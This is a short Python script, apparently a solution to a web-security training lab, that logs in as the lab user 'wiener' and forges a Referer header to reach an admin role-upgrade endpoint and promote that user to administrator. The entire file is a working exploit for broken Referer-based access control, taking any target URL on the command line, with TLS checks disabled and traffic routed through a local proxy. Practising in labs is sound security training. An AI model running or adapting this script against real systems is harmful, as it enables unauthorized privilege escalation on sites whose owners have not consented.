import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def promote_user(url):
    session = requests.session()
    print("(+) Logging as the wiener user..")
    login_url = url + "/login"
    login_data = {'username': 'wiener', 'password': 'peter'}
    res = session.post(login_url, data=login_data, verify=False, proxies=proxies)
    if "Log out" in res.text:
        print("(+) Successfully logged in as wiener user.")
        print("(+) Try to promote wiener to admin...")
        admin_roles_url = url + "/admin-roles?username=wiener&action=upgrade"
        headers = {'Referer': url + '/admin'}
        res = session.get(admin_roles_url, verify=False, proxies=proxies, headers=headers)
        if "wiener (ADMIN)" in res.text:
            print("(+) Successfully promoted wiener user to admin...")
        else:
            print("(-) Unable to promote wiener user to admin...")
            sys.exit(-1)
    else:
        print("(-) Could not login as wiener user...")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://www.example.com")
        sys.exit(-1)

    url = sys.argv[1].strip()
    promote_user(url)

if __name__ == "__main__":
    main()